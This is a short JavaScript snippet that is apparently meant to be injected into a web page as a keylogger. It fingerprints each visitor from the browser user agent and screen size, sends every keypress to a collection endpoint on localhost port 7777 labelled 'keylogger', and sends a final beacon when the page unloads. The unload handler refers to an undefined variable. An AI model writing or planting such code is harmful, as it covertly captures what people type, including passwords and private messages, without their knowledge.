const id = btoa(navigator.userAgent + screen.width + screen.height).slice(0, 12);

  document.addEventListener('keypress', function(e) {
      navigator.sendBeacon('http://localhost:7777/keylogger', JSON.stringify({
        done: false,
        id: id,
        key: e.key
      }));
  });

  window.addEventListener('beforeunload', function() {
      navigator.sendBeacon('http://localhost:7777/keylogger', JSON.stringify({
        done: true,
        id: id,
        key: e.key
      }));
  });
